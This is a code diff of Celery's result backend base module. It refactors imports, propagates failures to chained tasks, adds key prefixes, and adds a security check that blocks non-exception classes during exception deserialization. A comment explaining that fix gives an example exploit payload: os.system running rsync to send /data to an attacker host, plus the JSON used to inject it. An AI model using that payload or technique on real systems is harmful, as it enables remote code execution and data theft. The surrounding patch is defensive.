@@ -9,32 +9,28 @@ import sys
 import time
 import warnings
 from collections import namedtuple
-from datetime import datetime, timedelta
+from datetime import timedelta
 from functools import partial
 from weakref import WeakValueDictionary
 
 from billiard.einfo import ExceptionInfo
 from kombu.serialization import dumps, loads, prepare_accept_content
 from kombu.serialization import registry as serializer_registry
-from kombu.utils.encoding import bytes_to_str, ensure_bytes, from_utf8
+from kombu.utils.encoding import bytes_to_str, ensure_bytes
 from kombu.utils.url import maybe_sanitize_url
 
 import celery.exceptions
 from celery import current_app, group, maybe_signature, states
 from celery._state import get_current_task
-from celery.exceptions import (BackendGetMetaError, BackendStoreError,
-                               ChordError, ImproperlyConfigured,
-                               NotRegistered, TaskRevokedError, TimeoutError)
-from celery.result import (GroupResult, ResultBase, ResultSet,
-                           allow_join_result, result_from_tuple)
+from celery.app.task import Context
+from celery.exceptions import (BackendGetMetaError, BackendStoreError, ChordError, ImproperlyConfigured,
+                               NotRegistered, SecurityError, TaskRevokedError, TimeoutError)
+from celery.result import GroupResult, ResultBase, ResultSet, allow_join_result, result_from_tuple
 from celery.utils.collections import BufferMap
 from celery.utils.functional import LRUCache, arity_greater
 from celery.utils.log import get_logger
-from celery.utils.serialization import (create_exception_cls,
-                                        ensure_serializable,
-                                        get_pickleable_exception,
-                                        get_pickled_exception,
-                                        raise_with_context)
+from celery.utils.serialization import (create_exception_cls, ensure_serializable, get_pickleable_exception,
+                                        get_pickled_exception, raise_with_context)
 from celery.utils.time import get_exponential_backoff_interval
 
 __all__ = ('BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend')
@@ -74,6 +70,12 @@ class _nulldict(dict):
         pass
 
     __setitem__ = update = setdefault = ignore
+
+
+def _is_request_ignore_result(request):
+    if request is None:
+        return False
+    return request.ignore_result
 
 
 class Backend:
@@ -122,13 +124,14 @@ class Backend:
 
         # precedence: accept, conf.result_accept_content, conf.accept_content
         self.accept = conf.result_accept_content if accept is None else accept
-        self.accept = conf.accept_content if self.accept is None else self.accept  # noqa: E501
+        self.accept = conf.accept_content if self.accept is None else self.accept
         self.accept = prepare_accept_content(self.accept)
 
         self.always_retry = conf.get('result_backend_always_retry', False)
         self.max_sleep_between_retries_ms = conf.get('result_backend_max_sleep_between_retries_ms', 10000)
         self.base_sleep_between_retries_ms = conf.get('result_backend_base_sleep_between_retries_ms', 10)
         self.max_retries = conf.get('result_backend_max_retries', float("inf"))
+        self.thread_safe = conf.get('result_backend_thread_safe', False)
 
         self._pending_results = pending_results_t({}, WeakValueDictionary())
         self._pending_messages = BufferMap(MESSAGE_BUFFER_MAX)
@@ -150,7 +153,7 @@ class Backend:
     def mark_as_done(self, task_id, result,
                      request=None, store_result=True, state=states.SUCCESS):
         """Mark task as successfully executed."""
-        if store_result:
+        if (store_result and not _is_request_ignore_result(request)):
             self.store_result(task_id, result, state, request=request)
         if request and request.chord:
             self.on_chord_part_return(request, state, result)
@@ -164,8 +167,50 @@ class Backend:
             self.store_result(task_id, exc, state,
                               traceback=traceback, request=request)
         if request:
+            # This task may be part of a chord
             if request.chord:
                 self.on_chord_part_return(request, state, exc)
+            # It might also have chained tasks which need to be propagated to,
+            # this is most likely to be exclusive with being a direct part of a
+            # chord but we'll handle both cases separately.
+            #
+            # The `chain_data` try block here is a bit tortured since we might
+            # have non-iterable objects here in tests and it's easier this way.
+            try:
+                chain_data = iter(request.chain)
+            except (AttributeError, TypeError):
+                chain_data = tuple()
+            for chain_elem in chain_data:
+                # Reconstruct a `Context` object for the chained task which has
+                # enough information to for backends to work with
+                chain_elem_ctx = Context(chain_elem)
+                chain_elem_ctx.update(chain_elem_ctx.options)
+                chain_elem_ctx.id = chain_elem_ctx.options.get('task_id')
+                chain_elem_ctx.group = chain_elem_ctx.options.get('group_id')
+                # If the state should be propagated, we'll do so for all
+                # elements of the chain. This is only truly important so
+                # that the last chain element which controls completion of
+                # the chain itself is marked as completed to avoid stalls.
+                #
+                # Some chained elements may be complex signatures and have no
+                # task ID of their own, so we skip them hoping that not
+                # descending through them is OK. If the last chain element is
+                # complex, we assume it must have been uplifted to a chord by
+                # the canvas code and therefore the condition below will ensure
+                # that we mark something as being complete as avoid stalling.
+                if (
+                    store_result and state in states.PROPAGATE_STATES and
+                    chain_elem_ctx.task_id is not None
+                ):
+                    self.store_result(
+                        chain_elem_ctx.task_id, exc, state,
+                        traceback=traceback, request=chain_elem_ctx,
+                    )
+                # If the chain element is a member of a chord, we also need
+                # to call `on_chord_part_return()` as well to avoid stalls.
+                if 'chord' in chain_elem_ctx.options:
+                    self.on_chord_part_return(chain_elem_ctx, state, exc)
+            # And finally we'll fire any errbacks
             if call_errbacks and request.errbacks:
                 self._call_task_errbacks(request, exc, traceback)
 
@@ -186,7 +231,7 @@ class Backend:
                         hasattr(errback.type, '__header__') and
 
                         # workaround to support tasks with bind=True executed as
-                        # link errors. Otherwise retries can't be used
+                        # link errors. Otherwise, retries can't be used
                         not isinstance(errback.type.__header__, partial) and
                         arity_greater(errback.type.__header__, 1)
                 ):
@@ -235,19 +280,24 @@ class Backend:
                                  traceback=traceback, request=request)
 
     def chord_error_from_stack(self, callback, exc=None):
-        # need below import for test for some crazy reason
-        from celery import group  # pylint: disable
         app = self.app
         try:
             backend = app._tasks[callback.task].backend
         except KeyError:
             backend = self
+        # We have to make a fake request since either the callback failed or
+        # we're pretending it did since we don't have information about the
+        # chord part(s) which failed. This request is constructed as a best
+        # effort for new style errbacks and may be slightly misleading about
+        # what really went wrong, but at least we call them!
+        fake_request = Context({
+            "id": callback.options.get("task_id"),
+            "errbacks": callback.options.get("link_error", []),
+            "delivery_info": dict(),
+            **callback
+        })
         try:
-            group(
-                [app.signature(errback)
-                 for errback in callback.options.get('link_error') or []],
-                app=app,
-            ).apply_async((callback.id,))
+            self._call_task_errbacks(fake_request, exc, None)
         except Exception as eb_exc:  # pylint: disable=broad-except
             return backend.fail_from_current_stack(callback.id, exc=eb_exc)
         else:
@@ -284,34 +334,73 @@ class Backend:
 
     def exception_to_python(self, exc):
         """Convert serialized exception to Python exception."""
-        if exc:
-            if not isinstance(exc, BaseException):
-                exc_module = exc.get('exc_module')
-                if exc_module is None:
-                    cls = create_exception_cls(
-                        from_utf8(exc['exc_type']), __name__)
-                else:
-                    exc_module = from_utf8(exc_module)
-                    exc_type = from_utf8(exc['exc_type'])
-                    try:
-                        # Load module and find exception class in that
-                        cls = sys.modules[exc_module]
-                        # The type can contain qualified name with parent classes
-                        for name in exc_type.split('.'):
-                            cls = getattr(cls, name)
-                    except (KeyError, AttributeError):
-                        cls = create_exception_cls(exc_type,
-                                                   celery.exceptions.__name__)
-                exc_msg = exc['exc_message']
-                try:
-                    if isinstance(exc_msg, (tuple, list)):
-                        exc = cls(*exc_msg)
-                    else:
-                        exc = cls(exc_msg)
-                except Exception as err:  # noqa
-                    exc = Exception(f'{cls}({exc_msg})')
+        if not exc:
+            return None
+        elif isinstance(exc, BaseException):
             if self.serializer in EXCEPTION_ABLE_CODECS:
                 exc = get_pickled_exception(exc)
+            return exc
+        elif not isinstance(exc, dict):
+            try:
+                exc = dict(exc)
+            except TypeError as e:
+                raise TypeError(f"If the stored exception isn't an "
+                                f"instance of "
+                                f"BaseException, it must be a dictionary.\n"
+                                f"Instead got: {exc}") from e
+
+        exc_module = exc.get('exc_module')
+        try:
+            exc_type = exc['exc_type']
+        except KeyError as e:
+            raise ValueError("Exception information must include "
+                             "the exception type") from e
+        if exc_module is None:
+            cls = create_exception_cls(
+                exc_type, __name__)
+        else:
+            try:
+                # Load module and find exception class in that
+                cls = sys.modules[exc_module]
+                # The type can contain qualified name with parent classes
+                for name in exc_type.split('.'):
+                    cls = getattr(cls, name)
+            except (KeyError, AttributeError):
+                cls = create_exception_cls(exc_type,
+                                           celery.exceptions.__name__)
+        exc_msg = exc.get('exc_message', '')
+
+        # If the recreated exception type isn't indeed an exception,
+        # this is a security issue. Without the condition below, an attacker
+        # could exploit a stored command vulnerability to execute arbitrary
+        # python code such as:
+        # os.system("rsync /data attacker@192.168.56.100:~/data")
+        # The attacker sets the task's result to a failure in the result
+        # backend with the os as the module, the system function as the
+        # exception type and the payload
+        # rsync /data attacker@192.168.56.100:~/data
+        # as the exception arguments like so:
+        # {
+        #   "exc_module": "os",
+        #   "exc_type": "system",
+        #   "exc_message": "rsync /data attacker@192.168.56.100:~/data"
+        # }
+        if not isinstance(cls, type) or not issubclass(cls, BaseException):
+            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'
+            raise SecurityError(
+                f"Expected an exception class, got {fake_exc_type} with payload {exc_msg}")
+
+        # XXX: Without verifying `cls` is actually an exception class,
+        #      an attacker could execute arbitrary python code.
+        #      cls could be anything, even eval().
+        try:
+            if isinstance(exc_msg, (tuple, list)):
+                exc = cls(*exc_msg)
+            else:
+                exc = cls(exc_msg)
+        except Exception as err:  # noqa
+            exc = Exception(f'{cls}({exc_msg})')
+
         return exc
 
     def prepare_value(self, result):
@@ -371,7 +460,7 @@ class Backend:
                          state, traceback, request, format_date=True,
                          encode=False):
         if state in self.READY_STATES:
-            date_done = datetime.utcnow()
+            date_done = self.app.now()
             if format_date:
                 date_done = date_done.isoformat()
         else:
@@ -400,8 +489,11 @@ class Backend:
                     'retries': getattr(request, 'retries', None),
                     'queue': request.delivery_info.get('routing_key')
                     if hasattr(request, 'delivery_info') and
-                    request.delivery_info else None
+                    request.delivery_info else None,
                 }
+                if getattr(request, 'stamps', None):
+                    request_meta['stamped_headers'] = request.stamped_headers
+                    request_meta.update(request.stamps)
 
                 if encode:
                     # args and kwargs need to be encoded properly before saving
@@ -481,9 +573,10 @@ class Backend:
             pass
 
     def _ensure_not_eager(self):
-        if self.app.conf.task_always_eager:
+        if self.app.conf.task_always_eager and not self.app.conf.task_store_eager_result:
             warnings.warn(
-                "Shouldn't retrieve result with task_always_eager enabled.",
+                "Results are not stored in backend and should not be retrieved when "
+                "task_always_eager is enabled, unless task_store_eager_result is enabled.",
                 RuntimeWarning
             )
 
@@ -572,11 +665,7 @@ class Backend:
         return self._delete_group(group_id)
 
     def cleanup(self):
-        """Backend cleanup.
-
-        Note:
-            This is run by :class:`celery.task.DeleteExpiredTaskMetaTask`.
-        """
+        """Backend cleanup."""
 
     def process_cleanup(self):
         """Cleanup actions to do at the end of a task worker process."""
@@ -590,11 +679,25 @@ class Backend:
     def on_chord_part_return(self, request, state, result, **kwargs):
         pass
 
+    def set_chord_size(self, group_id, chord_size):
+        pass
+
     def fallback_chord_unlock(self, header_result, body, countdown=1,
                               **kwargs):
         kwargs['result'] = [r.as_tuple() for r in header_result]
-        queue = body.options.get('queue', getattr(body.type, 'queue', None))
-        priority = body.options.get('priority', getattr(body.type, 'priority', 0))
+        try:
+            body_type = getattr(body, 'type', None)
+        except NotRegistered:
+            body_type = None
+
+        queue = body.options.get('queue', getattr(body_type, 'queue', None))
+
+        if queue is None:
+            # fallback to default routing if queue name was not
+            # explicitly passed to body callback
+            queue = self.app.amqp.router.route(kwargs, body.name)['queue'].name
+
+        priority = body.options.get('priority', getattr(body_type, 'priority', 0))
         self.app.tasks['celery.chord_unlock'].apply_async(
             (header_result.id, body,), kwargs,
             countdown=countdown,
@@ -605,8 +708,9 @@ class Backend:
     def ensure_chords_allowed(self):
         pass
 
-    def apply_chord(self, header_result, body, **kwargs):
+    def apply_chord(self, header_result_args, body, **kwargs):
         self.ensure_chords_allowed()
+        header_result = self.app.GroupResult(*header_result_args)
         self.fallback_chord_unlock(header_result, body, **kwargs)
 
     def current_task_children(self, request=None):
@@ -701,7 +805,7 @@ class BaseBackend(Backend, SyncBackendMixin):
     """Base (synchronous) result backend."""
 
 
-BaseDictBackend = BaseBackend  # noqa: E305 XXX compat
+BaseDictBackend = BaseBackend  # XXX compat
 
 
 class BaseKeyValueStoreBackend(Backend):
@@ -714,10 +818,26 @@ class BaseKeyValueStoreBackend(Backend):
     def __init__(self, *args, **kwargs):
         if hasattr(self.key_t, '__func__'):  # pragma: no cover
             self.key_t = self.key_t.__func__  # remove binding
-        self._encode_prefixes()
         super().__init__(*args, **kwargs)
+        self._add_global_keyprefix()
+        self._encode_prefixes()
         if self.implements_incr:
             self.apply_chord = self._apply_chord_incr
+
+    def _add_global_keyprefix(self):
+        """
+        This method prepends the global keyprefix to the existing keyprefixes.
+
+        This method checks if a global keyprefix is configured in `result_backend_transport_options` using the
+        `global_keyprefix` key. If so, then it is prepended to the task, group and chord key prefixes.
+        """
+        global_keyprefix = self.app.conf.get('result_backend_transport_options', {}).get("global_keyprefix", None)
+        if global_keyprefix:
+            if global_keyprefix[-1] not in ':_-.':
+                global_keyprefix += '_'
+            self.task_keyprefix = f"{global_keyprefix}{self.task_keyprefix}"
+            self.group_keyprefix = f"{global_keyprefix}{self.group_keyprefix}"
+            self.chord_keyprefix = f"{global_keyprefix}{self.chord_keyprefix}"
 
     def _encode_prefixes(self):
         self.task_keyprefix = self.key_t(self.task_keyprefix)
@@ -747,23 +867,27 @@ class BaseKeyValueStoreBackend(Backend):
 
     def get_key_for_task(self, task_id, key=''):
         """Get the cache key for a task by id."""
-        key_t = self.key_t
-        return key_t('').join([
-            self.task_keyprefix, key_t(task_id), key_t(key),
-        ])
+        if not task_id:
+            raise ValueError(f'task_id must not be empty. Got {task_id} instead.')
+        return self._get_key_for(self.task_keyprefix, task_id, key)
 
     def get_key_for_group(self, group_id, key=''):
         """Get the cache key for a group by id."""
-        key_t = self.key_t
-        return key_t('').join([
-            self.group_keyprefix, key_t(group_id), key_t(key),
-        ])
+        if not group_id:
+            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
+        return self._get_key_for(self.group_keyprefix, group_id, key)
 
     def get_key_for_chord(self, group_id, key=''):
         """Get the cache key for the chord waiting on group with given id."""
+        if not group_id:
+            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
+        return self._get_key_for(self.chord_keyprefix, group_id, key)
+
+    def _get_key_for(self, prefix, id, key=''):
         key_t = self.key_t
+
         return key_t('').join([
-            self.chord_keyprefix, key_t(group_id), key_t(key),
+            prefix, key_t(id), key_t(key),
         ])
 
     def _strip_prefix(self, key):
@@ -853,7 +977,11 @@ class BaseKeyValueStoreBackend(Backend):
         if current_meta['status'] == states.SUCCESS:
             return result
 
-        self._set_with_state(self.get_key_for_task(task_id), self.encode(meta), state)
+        try:
+            self._set_with_state(self.get_key_for_task(task_id), self.encode(meta), state)
+        except BackendStoreError as ex:
+            raise BackendStoreError(str(ex), state=state, task_id=task_id) from ex
+
         return result
 
     def _save_group(self, group_id, result):
@@ -883,8 +1011,9 @@ class BaseKeyValueStoreBackend(Backend):
             meta['result'] = result_from_tuple(result, self.app)
             return meta
 
-    def _apply_chord_incr(self, header_result, body, **kwargs):
+    def _apply_chord_incr(self, header_result_args, body, **kwargs):
         self.ensure_chords_allowed()
+        header_result = self.app.GroupResult(*header_result_args)
         header_result.save(backend=self)
 
     def on_chord_part_return(self, request, state, result, **kwargs):
@@ -928,7 +1057,9 @@ class BaseKeyValueStoreBackend(Backend):
             j = deps.join_native if deps.supports_native_join else deps.join
             try:
                 with allow_join_result():
-                    ret = j(timeout=3.0, propagate=True)
+                    ret = j(
+                        timeout=app.conf.result_chord_join_timeout,
+                        propagate=True)
             except Exception as exc:  # pylint: disable=broad-except
                 try:
                     culprit = next(deps._failed_join_report())
@@ -951,7 +1082,7 @@ class BaseKeyValueStoreBackend(Backend):
                     )
             finally:
                 deps.delete()
-                self.client.delete(key)
+                self.delete(key)
         else:
             self.expire(key, self.expires)
 
